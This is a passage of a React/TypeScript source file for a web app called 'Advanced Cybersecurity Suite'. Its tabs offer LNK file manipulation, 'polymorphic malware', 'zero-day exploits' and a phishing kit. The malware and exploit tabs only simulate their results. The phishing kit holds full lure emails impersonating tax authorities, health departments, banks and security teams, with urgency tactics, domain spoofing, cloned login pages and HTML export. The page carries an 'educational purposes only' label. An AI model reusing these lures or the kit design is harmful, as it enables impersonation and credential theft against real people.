              <p>This is an official notification from the Tax Authority. Please do not reply to this email.</p>
            </div>
          </div>
        )
        break

      case "covid-alert":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center text-white font-bold">
                    <AlertTriangle className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Health Department</div>
                <div className="text-xs text-gray-500">
                  covid-alerts@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.gov
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 10:30 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2 text-red-600">URGENT: COVID-19 Exposure Notification</div>
              <p className="mb-2">Dear Citizen,</p>
              <p className="mb-2">
                Our records indicate that you may have been in close proximity to someone who has tested positive for
                COVID-19.
              </p>
              <div className="my-3 border border-red-200 rounded p-2 bg-red-50">
                <p className="font-semibold">Important Information:</p>
                <p>Exposure Date: {new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
                <p>Location: Public area in your community</p>
                <p>Risk Level: Moderate to High</p>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  Immediate action is required to protect yourself and others.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-red-600 text-white px-4 py-2 rounded">Verify Exposure & Schedule Test</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">Based on your health profile, we recommend scheduling a test within 48 hours.</p>
              )}
              <p className="mt-4">
                Stay safe,
                <br />
                Public Health Team
                <br />
                {targetOrganization} Health Department
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This is an automated health alert. For more information about COVID-19, visit our official website.</p>
            </div>
          </div>
        )
        break

      case "security-breach":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-red-700 rounded-full flex items-center justify-center text-white font-bold">
                    <Shield className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Security Center</div>
                <div className="text-xs text-gray-500">
                  security-alerts@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 07:45 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2 text-red-700">CRITICAL: Security Breach Affecting Your Account</div>
              <p className="mb-2">Dear Customer,</p>
              <p className="mb-2">
                We are contacting you regarding a recent security incident that may have affected your account with{" "}
                {targetOrganization}.
              </p>
              <div className="my-3 border border-red-300 rounded p-2 bg-red-50">
                <p className="font-semibold">Incident Details:</p>
                <p>Date Detected: {new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
                <p>Systems Affected: User authentication database</p>
                <p>Information at Risk: Names, email addresses, and potentially passwords</p>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  Your account security is at risk. Immediate action is required.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-red-700 text-white px-4 py-2 rounded">Secure Your Account Now</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">
                  As a valued customer since 2019, we're providing you with priority support for this issue.
                </p>
              )}
              <p className="mt-4">
                Regards,
                <br />
                Security Response Team
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>If you have any questions, please contact our dedicated support line at 1-888-555-0123.</p>
            </div>
          </div>
        )
        break

      case "subscription-renewal":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-indigo-600 rounded-full flex items-center justify-center text-white font-bold">
                    <Calendar className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Premium Services</div>
                <div className="text-xs text-gray-500">
                  billing@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 14:20 PM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Action Required: Your Subscription Will Expire Soon</div>
              <p className="mb-2">Dear Valued Customer,</p>
              <p className="mb-2">
                Your premium subscription with {targetOrganization} is about to expire. To ensure uninterrupted access
                to our services, please renew your subscription.
              </p>
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Subscription Details:</p>
                <p>Plan: Premium {Math.floor(Math.random() * 3) + 1}</p>
                <p>Expiration Date: {new Date(Date.now() + 5 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
                <p>Renewal Price: ${(Math.random() * 50 + 9.99).toFixed(2)}/month</p>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  Your subscription expires in 5 days. Renew now to avoid service interruption.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-indigo-600 text-white px-4 py-2 rounded">Renew Subscription</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">
                  As one of our earliest subscribers, you're eligible for a loyalty discount on your renewal.
                </p>
              )}
              <p className="mt-4">
                Best regards,
                <br />
                Billing Team
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>If you wish to cancel your subscription or have any questions, please contact our customer support.</p>
            </div>
          </div>
        )
        break

      default:
        previewContent = (
          <div className="border rounded-md p-4 bg-gray-50 text-center">
            <p>Select a template to see the email preview</p>
          </div>
        )
    }

    setEmailPreview(previewContent)
  }

  const handleCopyHtml = () => {
    if (emailHtmlSource) {
      navigator.clipboard
        .writeText(emailHtmlSource)
        .then(() => {
          setCopySuccess(true)
          setTimeout(() => setCopySuccess(false), 2000)
        })
        .catch((err) => {
          console.error("Failed to copy: ", err)
        })
    }
  }

  const handleDownloadHtml = () => {
    if (emailHtmlSource) {
      const blob = new Blob([emailHtmlSource], { type: "text/html" })
      const url = URL.createObjectURL(blob)
      const a = document.createElement("a")
      a.href = url
      a.download = `${phishingTemplate}-template-${targetOrganization.toLowerCase().replace(/\s+/g, "-")}.html`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
    }
  }

  const handleSubmit = async (e: React.FormEvent, operation: "lnk" | "malware" | "phishing") => {
    e.preventDefault()
    try {
      // Simulated API call
      await new Promise((resolve) => setTimeout(resolve, 1000))

      if (operation === "phishing") {
        // Generate a sample phishing email based on the selected template
        let emailContent = ""

        switch (phishingTemplate) {
          case "password-reset":
            emailContent = `Subject: Urgent Security Alert - Password Reset Required\n\nDear ${targetOrganization} User,\n\nOur security system has detected unusual login attempts on your account. To protect your information, please reset your password immediately by clicking the secure link below:\n\n[Secure Password Reset Link]\n\nIf you did not request this change, please contact our security department immediately.\n\nSecurity Team\n${targetOrganization}`
            break
          case "account-verification":
            emailContent = `Subject: Account Verification Required - Action Needed\n\nDear Valued ${targetOrganization} Customer,\n\nWe are conducting a routine verification of all accounts. To avoid service interruption, please verify your account details by following this link:\n\n[Account Verification Link]\n\nThis process will only take a few minutes of your time.\n\nCustomer Support Team\n${targetOrganization}`
            break
          case "invoice":
            emailContent = `Subject: Invoice #INV-29581 - Payment Required\n\nDear ${targetOrganization} Client,\n\nPlease find attached the invoice #INV-29581 for recent services. Payment is due within 7 days.\n\nTo view and pay your invoice securely, please click here:\n\n[View Invoice]\n\nThank you for your business.\n\nBilling Department\n${targetOrganization}`
            break
          case "package-delivery":
            emailContent = `Subject: Package Delivery Notification - Action Required\n\nHello,\n\nA package addressed to you is pending delivery. Unfortunately, we couldn't deliver it due to an incomplete address.\n\nTo reschedule your delivery, please confirm your details here:\n\n[Confirm Delivery Details]\n\nDelivery Service\nOn behalf of ${targetOrganization}`
            break
          case "cloud-storage":
            emailContent = `Subject: Important Document Shared With You\n\nHello,\n\nA document has been shared with you via ${targetOrganization} Cloud Storage.\n\nFile: Confidential_Document.docx\n\nThis shared document will expire in 24 hours. To view the document, please click the link below:\n\n[View Document]\n\nBest regards,\n${targetOrganization} Cloud Team`
            break
          case "bank-alert":
            emailContent = `Subject: Important Security Alert: Unusual Transaction Detected\n\nDear Valued Customer,\n\nOur fraud detection system has identified an unusual transaction on your account that requires your immediate verification.\n\nTransaction Details:\nDate: ${new Date().toLocaleDateString()}\nAmount: $1,249.99\nMerchant: Foreign Online Retailer\nLocation: Overseas\n\nIf you do not recognize this transaction, please verify your account immediately to prevent further unauthorized charges.\n\n[Verify Transaction]\n\nSincerely,\nSecurity Team\n${targetOrganization} Banking`
            break
          case "social-media":
            emailContent = `Subject: You have a new message from John Smith\n\nHello,\n\nYou have received a new private message on your ${targetOrganization} Social account.\n\nJohn Smith sent you a message:\n"Hey, long time no see! Check out this link I found..."\n\nTo view this message, click here:\n\n[View Message]\n\nThanks,\n${targetOrganization} Social Team`
            break
          case "job-opportunity":
            emailContent = `Subject: Exclusive Job Opportunity: Senior Position Available\n\nDear Professional,\n\nBased on your impressive profile and experience, we would like to invite you to apply for a senior position at ${targetOrganization}.\n\nSenior Developer Position\nSalary Range: $120,000 - $150,000\nLocation: Remote / Hybrid\n\nRequirements:\n- 5+ years of experience\n- Leadership skills\n- Advanced technical knowledge\n\nTo view job details and apply, click here:\n\n[View Job Details & Apply]\n\nBest regards,\nRecruitment Team\n${targetOrganization}`
            break
          case "software-update":
            emailContent = `Subject: Critical Security Update Required\n\nDear User,\n\nA critical security vulnerability has been identified in your ${targetOrganization} software that requires immediate attention.\n\nUpdate Details:\nVersion: 10.5.2\nPriority: Critical\n\nFixes:\n- Security vulnerability CVE-2023-XXXXX\n- Data protection improvements\n- Performance enhancements\n\nTo download the security update, click here:\n\n[Download Security Update]\n\nThank you for your prompt attention to this matter.\n\nRegards,\nSecurity Team\n${targetOrganization} Software`
            break
          case "tax-refund":
            emailContent = `Subject: Important: Tax Refund Notification\n\nDear Taxpayer,\n\nAfter the latest review of your fiscal activity, we have determined that you are eligible for a tax refund of $${(Math.random() * 2000 + 500).toFixed(2)}.\n\nTo claim your refund, please verify your information and select your preferred payment method by clicking the link below:\n\n[Claim Your Refund Now]\n\nThis refund must be claimed within 14 days or it will be forfeited.\n\nSincerely,\nRefund Department\n${targetOrganization} Tax Authority`
            break
          case "covid-alert":
            emailContent = `Subject: URGENT: COVID-19 Exposure Notification\n\nDear Citizen,\n\nOur records indicate that you may have been in close proximity to someone who has tested positive for COVID-19 on ${new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toLocaleDateString()}.\n\nPlease follow these steps immediately:\n1. Complete the exposure verification form\n2. Schedule a COVID-19 test\n3. Self-isolate until you receive your test results\n\n[Verify Exposure & Schedule Test]\n\nStay safe,\nPublic Health Team\n${targetOrganization} Health Department`
            break
          case "security-breach":
            emailContent = `Subject: CRITICAL: Security Breach Affecting Your Account\n\nDear Customer,\n\nWe are contacting you regarding a recent security incident that may have affected your account with ${targetOrganization}.\n\nIncident Details:\nDate Detected: ${new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleDateString()}\nSystems Affected: User authentication database\nInformation at Risk: Names, email addresses, and potentially passwords\n\nTo protect your account, we strongly recommend that you change your password immediately and enable two-factor authentication.\n\n[Secure Your Account Now]\n\nRegards,\nSecurity Response Team\n${targetOrganization}`
            break
          case "subscription-renewal":
            emailContent = `Subject: Action Required: Your Subscription Will Expire Soon\n\nDear Valued Customer,\n\nYour premium subscription with ${targetOrganization} is about to expire on ${new Date(Date.now() + 5 * 24 * 60 * 60 * 1000).toLocaleDateString()}.\n\nTo ensure uninterrupted access to our services, please renew your subscription by clicking the link below:\n\n[Renew Subscription]\n\nYour subscription expires in 5 days. Renew now to avoid service interruption.\n\nBest regards,\nBilling Team\n${targetOrganization}`
            break
          default:
            emailContent = "Please select a template to generate email content."
        }

        setGeneratedEmail(emailContent)
        setResult({
          success: true,
          message: "Phishing email template generated successfully. For educational purposes only.",
        })
      } else {
        setResult({
          success: true,
          message:
            operation === "lnk"
              ? "LNK file manipulation completed successfully."
              : "Malware configuration completed successfully.",
        })
      }
    } catch (error) {
      setResult({
        success: false,
        message: "An error occurred while processing the request.",
      })
    }
  }

  return (
    <div className="max-w-6xl mx-auto p-6 space-y-8">
      <h1 className="text-3xl font-bold text-center mb-6">Advanced Cybersecurity Suite</h1>
      <div className="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
        <p className="text-yellow-700">
          <strong>Educational Purpose Only:</strong> This suite is designed for cybersecurity education and research.
          Use of these tools against systems without explicit permission is illegal and unethical.
        </p>
      </div>
      <Tabs defaultValue="lnk" className="space-y-6">
        <TabsList className="flex flex-col sm:flex-row w-full gap-2 sm:gap-4 h-auto">
          <TabsTrigger value="lnk" className="flex-1 px-4 py-2 text-sm sm:text-base">
            <LinkIcon className="w-4 h-4 mr-2 hidden sm:inline-block" />
            LNK Manipulator
          </TabsTrigger>
          <TabsTrigger value="polymorphic" className="flex-1 px-4 py-2 text-sm sm:text-base">
            <Shield className="w-4 h-4 mr-2 hidden sm:inline-block" />
            Polymorphic Malware
          </TabsTrigger>
          <TabsTrigger value="zeroday" className="flex-1 px-4 py-2 text-sm sm:text-base">
            <Bug className="w-4 h-4 mr-2 hidden sm:inline-block" />
            Zero-Day Exploits
          </TabsTrigger>
          <TabsTrigger value="phishing" className="flex-1 px-4 py-2 text-sm sm:text-base">
            <Mail className="w-4 h-4 mr-2 hidden sm:inline-block" />
            Phishing Kit
          </TabsTrigger>
        </TabsList>

        {/* LNK Tab Content */}
        <TabsContent value="lnk">
          <Card>
            <CardHeader>
              <CardTitle>LNK File Manipulation</CardTitle>
              <CardDescription>Modify metadata of LNK files with advanced options</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={(e) => handleSubmit(e, "lnk")} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="lnk-file">LNK File Path</Label>
                    <Input
                      id="lnk-file"
                      value={lnkFile}
                      onChange={(e) => setLnkFile(e.target.value)}
                      placeholder="C:\Users\Public\Desktop\myfile.lnk"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="lnk-operation">Operation</Label>
                    <Select onValueChange={setLnkOperation} required>
                      <SelectTrigger id="lnk-operation">
                        <SelectValue placeholder="Select operation" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="name">Change File Name</SelectItem>
                        <SelectItem value="date">Change File Date</SelectItem>
                        <SelectItem value="size">Change File Size</SelectItem>
                        <SelectItem value="path">Change File Path</SelectItem>
                        <SelectItem value="icon">Change File Icon</SelectItem>
                        <SelectItem value="target">Change File Target</SelectItem>
                        <SelectItem value="arguments">Change Arguments</SelectItem>
                        <SelectItem value="workingDir">Change Working Directory</SelectItem>
                        <SelectItem value="description">Change Description</SelectItem>
                        <SelectItem value="hotkey">Change Hotkey</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="lnk-value">New Value</Label>
                  <Input
                    id="lnk-value"
                    value={lnkValue}
                    onChange={(e) => setLnkValue(e.target.value)}
                    placeholder="Enter new value"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>File Attributes</Label>
                  <div className="flex flex-wrap gap-4">
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="hidden"
                        checked={isHidden}
                        onCheckedChange={(checked) => setIsHidden(checked as boolean)}
                      />
                      <Label htmlFor="hidden">Hidden</Label>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="readonly"
                        checked={isReadOnly}
                        onCheckedChange={(checked) => setIsReadOnly(checked as boolean)}
                      />
                      <Label htmlFor="readonly">Read-only</Label>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="system"
                        checked={isSystem}
                        onCheckedChange={(checked) => setIsSystem(checked as boolean)}
                      />
                      <Label htmlFor="system">System</Label>
                    </div>
                  </div>
                </div>
                <Button type="submit" className="w-full">
                  Execute LNK Operation
                </Button>
              </form>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Polymorphic Malware Tab Content */}
        <TabsContent value="polymorphic">
          <Card>
            <CardHeader>
              <CardTitle>Polymorphic Malware Configuration</CardTitle>
              <CardDescription>Configure the behavior and characteristics of the polymorphic malware</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={(e) => handleSubmit(e, "malware")} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="polymorphism-level">Polymorphism Level</Label>
                    <Select onValueChange={setPolymorphismLevel} defaultValue={polymorphismLevel}>
                      <SelectTrigger id="polymorphism-level">
                        <SelectValue placeholder="Select level" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="low">Low</SelectItem>
                        <SelectItem value="medium">Medium</SelectItem>
                        <SelectItem value="high">High</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="variant-count">Number of Variants</Label>
                    <Input
                      id="variant-count"
                      type="number"
                      min="1"
                      value={variantCount}
                      onChange={(e) => setVariantCount(Number.parseInt(e.target.value))}
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label>Obfuscation Methods</Label>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                    {["Encryption", "Code obfuscation", "Name substitution", "Padding", "Debug options disabled"].map(
                      (method) => (
                        <div key={method} className="flex items-center space-x-2">
                          <Checkbox
                            id={method.toLowerCase().replace(" ", "-")}
                            onCheckedChange={(checked) => {
                              if (checked) {
                                setObfuscationMethods((prev) => [...prev, method])
                              } else {
                                setObfuscationMethods((prev) => prev.filter((m) => m !== method))
                              }
                            }}
                          />
                          <Label htmlFor={method.toLowerCase().replace(" ", "-")}>{method}</Label>
                        </div>
                      ),
                    )}
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="variant-interval">Variant Generation Interval (minutes)</Label>
                  <Slider
                    id="variant-interval"
                    min={1}
                    max={1440}
                    step={1}
                    value={[variantInterval]}
                    onValueChange={(value) => setVariantInterval(value[0])}
                  />
                  <div className="text-sm text-muted-foreground mt-1">Current: {variantInterval} minutes</div>
                </div>
                <Button type="submit" className="w-full">
                  Generate Polymorphic Malware
                </Button>
              </form>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Zero-Day Exploits Tab Content */}
        <TabsContent value="zeroday">
          <Card>
            <CardHeader>
              <CardTitle>Zero-Day Exploit Configuration</CardTitle>
              <CardDescription>Set up the zero-day vulnerability exploit and payload</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={(e) => handleSubmit(e, "malware")} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="vulnerability">Select Vulnerability</Label>
                    <Select onValueChange={setSelectedVulnerability}>
                      <SelectTrigger id="vulnerability">
                        <SelectValue placeholder="Choose a vulnerability" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="cve-2023-0001">CVE-2023-0001: Windows Kernel Vulnerability</SelectItem>
                        <SelectItem value="cve-2023-0002">CVE-2023-0002: macOS Privilege Escalation</SelectItem>
                        <SelectItem value="cve-2023-0003">CVE-2023-0003: Linux Remote Code Execution</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="payload">Payload</Label>
                    <Select onValueChange={setPayload}>
                      <SelectTrigger id="payload">
                        <SelectValue placeholder="Select payload" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="info-gather">Information Gathering</SelectItem>
                        <SelectItem value="remote-control">Remote System Control</SelectItem>
                        <SelectItem value="malware-spread">Spread Additional Malware</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="custom-payload">Custom Payload Configuration</Label>
                  <Textarea
                    id="custom-payload"
                    placeholder="Enter custom payload configuration..."
                    className="min-h-[100px]"
                  />
                </div>
                <Button type="submit" className="w-full">
                  Generate Zero-Day Exploit
                </Button>
              </form>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Phishing Kit Tab Content */}
        <TabsContent value="phishing">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <CardTitle>Advanced Phishing Kit</CardTitle>
                <CardDescription>
                  Create and customize phishing email templates for security awareness training
                </CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={(e) => handleSubmit(e, "phishing")} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="phishing-template">Email Template</Label>
                    <Select onValueChange={setPhishingTemplate} required>
                      <SelectTrigger id="phishing-template">
                        <SelectValue placeholder="Select template" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="password-reset">Password Reset</SelectItem>
                        <SelectItem value="account-verification">Account Verification</SelectItem>
                        <SelectItem value="invoice">Invoice/Payment</SelectItem>
                        <SelectItem value="package-delivery">Package Delivery</SelectItem>
                        <SelectItem value="cloud-storage">Cloud Storage Share</SelectItem>
                        <SelectItem value="bank-alert">Banking Alert</SelectItem>
                        <SelectItem value="social-media">Social Media Notification</SelectItem>
                        <SelectItem value="job-opportunity">Job Opportunity</SelectItem>
                        <SelectItem value="software-update">Software Update</SelectItem>
                        <SelectItem value="tax-refund">Tax Refund</SelectItem>
                        <SelectItem value="covid-alert">COVID-19 Alert</SelectItem>
                        <SelectItem value="security-breach">Security Breach</SelectItem>
                        <SelectItem value="subscription-renewal">Subscription Renewal</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="target-organization">Target Organization</Label>
                    <Input
                      id="target-organization"
                      value={targetOrganization}
                      onChange={(e) => setTargetOrganization(e.target.value)}
                      placeholder="Organization name (e.g., Acme Corp)"
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="target-audience">Target Audience</Label>
                    <Select onValueChange={setTargetAudience} defaultValue={targetAudience}>
                      <SelectTrigger id="target-audience">
                        <SelectValue placeholder="Select audience" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="employees">Employees</SelectItem>
                        <SelectItem value="customers">Customers</SelectItem>
                        <SelectItem value="executives">Executives</SelectItem>
                        <SelectItem value="it-staff">IT Staff</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label>Phishing Type</Label>
                    <RadioGroup
                      defaultValue="corporate"
                      value={phishingType}
                      onValueChange={setPhishingType}
                      className="grid grid-cols-2 gap-2"
                    >
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="corporate" id="corporate" />
                        <Label htmlFor="corporate">Corporate</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="personal" id="personal" />
                        <Label htmlFor="personal">Personal</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="financial" id="financial" />
                        <Label htmlFor="financial">Financial</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="service" id="service" />
                        <Label htmlFor="service">Service Provider</Label>
                      </div>
                    </RadioGroup>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="sophistication-level">Sophistication Level</Label>
                    <Slider
                      id="sophistication-level"
                      min={1}
                      max={10}
                      step={1}
                      value={[sophisticationLevel]}
                      onValueChange={(value) => setSophisticationLevel(value[0])}
                    />
                    <div className="flex justify-between text-xs text-muted-foreground">
                      <span>Basic</span>
                      <span>Current: {sophisticationLevel}</span>
                      <span>Advanced</span>
                    </div>
                  </div>

                  <Separator />

                  <div className="space-y-2">
                    <Label className="text-base font-medium">Advanced Engineering Techniques</Label>

                    <div className="grid grid-cols-2 gap-4 mt-2">
                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="urgency-tactics"
                                checked={useUrgencyTactics}
                                onCheckedChange={(checked) => setUseUrgencyTactics(checked as boolean)}
                              />
                              <Label htmlFor="urgency-tactics">Urgency Tactics</Label>
                            </div>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p className="w-60 text-xs">Creates a sense of urgency to prompt immediate action</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>

                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="social-proofing"
                                checked={useSocialProofing}
                                onCheckedChange={(checked) => setUseSocialProofing(checked as boolean)}
                              />
                              <Label htmlFor="social-proofing">Social Proofing</Label>
                            </div>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p className="w-60 text-xs">Uses social influence to increase credibility</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>

                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="personalization"
                                checked={usePersonalization}
                                onCheckedChange={(checked) => setUsePersonalization(checked as boolean)}
                              />
                              <Label htmlFor="personalization">Personalization</Label>
                            </div>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p className="w-60 text-xs">Adds personalized elements to increase trust</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>

                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="domain-spoofing"
                                checked={domainSpoofing}
                                onCheckedChange={(checked) => setDomainSpoofing(checked as boolean)}
                              />
                              <Label htmlFor="domain-spoofing">Domain Spoofing</Label>
                            </div>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p className="w-60 text-xs">Simulates similar domain to the legitimate one</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>

                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <div className="flex items-center space-x-2">
                              <Checkbox
                                id="tracking-pixel"
                                checked={trackingPixel}
                                onCheckedChange={(checked) => setTrackingPixel(checked as boolean)}
                              />
                              <Label htmlFor="tracking-pixel">Tracking Pixel</Label>
                            </div>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p className="w-60 text-xs">Embeds invisible tracking to monitor email opens</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                    </div>

                    <div className="space-y-2 mt-4">
                      <Label htmlFor="redirect-method">Redirect Method</Label>
                      <Select onValueChange={setRedirectMethod} defaultValue={redirectMethod}>
                        <SelectTrigger id="redirect-method">
                          <SelectValue placeholder="Select method" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="direct">Direct Link</SelectItem>
                          <SelectItem value="iframe">iFrame Embedding</SelectItem>
                          <SelectItem value="shortened">URL Shortener</SelectItem>
                          <SelectItem value="obfuscated">Obfuscated URL</SelectItem>
                        </SelectContent>
                      </Select>
                      <div className="flex items-center mt-2">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setShowRedirectCode(!showRedirectCode)}
                          className="text-xs"
                        >
                          {showRedirectCode ? "Hide Code" : "Show Code"}
                        </Button>
                        {showRedirectCode && (
                          <Button variant="outline" size="sm" onClick={handleCopyRedirectCode} className="ml-2 text-xs">
                            {redirectCodeCopied ? (
                              <>
                                <Check className="h-3 w-3 mr-1" /> Copied
                              </>
                            ) : (
                              <>
                                <Copy className="h-3 w-3 mr-1" /> Copy Code
                              </>
                            )}
                          </Button>
                        )}
                      </div>
                      {showRedirectCode && (
                        <div className="mt-2 p-3 bg-gray-50 rounded-md border text-xs overflow-auto max-h-[200px]">
                          <pre className="whitespace-pre-wrap">{getRedirectCode(redirectMethod)}</pre>
                        </div>
                      )}
                    </div>

                    <div className="space-y-2 mt-4">
                      <Label htmlFor="landing-page">Landing Page Type</Label>
                      <Select onValueChange={setLandingPageType} defaultValue={landingPageType}>
                        <SelectTrigger id="landing-page">
                          <SelectValue placeholder="Select landing page" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="login">Login Portal Clone</SelectItem>
                          <SelectItem value="form">Data Collection Form</SelectItem>
                          <SelectItem value="download">File Download</SelectItem>
                          <SelectItem value="redirect">Legitimate Site Redirect</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="include-attachment"
                        checked={includeAttachment}
                        onCheckedChange={(checked) => setIncludeAttachment(checked as boolean)}
                      />
                      <Label htmlFor="include-attachment">Include Attachment</Label>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="include-logo"
                        checked={includeLogo}
                        onCheckedChange={(checked) => setIncludeLogo(checked as boolean)}
                      />
                      <Label htmlFor="include-logo">Include Organization Logo</Label>
                    </div>
                  </div>

                  <Button type="submit" className="w-full">
                    Generate Phishing Campaign
                  </Button>
                </form>
              </CardContent>
            </Card>

            <div className="space-y-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    <span>Email Preview</span>
                    <div className="flex items-center space-x-2">
                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button
                              variant="outline"
                              size="icon"
                              onClick={handleCopyHtml}
                              className={copySuccess ? "bg-green-100" : ""}
                            >
                              {copySuccess ? (
                                <Check className="h-4 w-4 text-green-600" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p>Copy HTML</p>
                          </TooltipContent>
